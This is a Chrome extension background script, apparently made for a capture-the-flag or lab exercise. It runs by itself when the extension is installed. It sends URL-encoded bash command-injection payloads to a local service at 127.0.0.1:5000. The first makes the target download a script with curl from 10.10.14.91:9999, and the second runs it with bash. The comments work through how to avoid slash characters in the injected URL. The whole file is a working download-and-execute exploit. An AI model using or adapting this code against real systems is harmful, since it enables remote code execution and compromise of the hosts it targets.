chrome.runtime.onInstalled.addListener(async () => {
  // Two-step approach to avoid pipe issues in URL
  // Step 1: Download script via curl -o (use $HOME to avoid slashes)
  // curl -o $HOME/.x.sh 10.10.14.91:9999
  // No slashes needed! $HOME is expanded by bash

  // Step 1: Download
  // Payload: a[$(curl -o $HOME/.x.sh 10.10.14.91:9999)]
  // Manually URL-encode: a%5B%24%28curl%20-o%20%24HOME%2F.x.sh%2010.10.14.91%3A9999%29%5D
  // WAIT - $HOME/.x.sh contains / which is %2F -- problematic

  // Alternative: use -o /tmp/.x.sh -> also has /
  // Use environment: TMPDIR or just use current directory
  // a[$(curl -o .x.sh 10.10.14.91:9999)]  -- saves to cwd
  // a[$(bash .x.sh)]  -- executes from cwd

  // Step 1: save to current directory
  const dl = "http://127.0.0.1:5000/routines/a%5B%24%28curl%20-o%20.x.sh%2010.10.14.91%3A9999%29%5D";
  try {
    const r = await fetch(dl);
    console.log("[DL] " + await r.text());
  } catch(e) {
    console.log("[DL-ERR] " + e.message);
  }

  // Step 2: execute
  const exec = "http://127.0.0.1:5000/routines/a%5B%24%28bash%20.x.sh%29%5D";
  try {
    const r = await fetch(exec);
    console.log("[EXEC] " + await r.text());
  } catch(e) {
    console.log("[EXEC-ERR] " + e.message);
  }

  console.log("=== DONE ===");
});
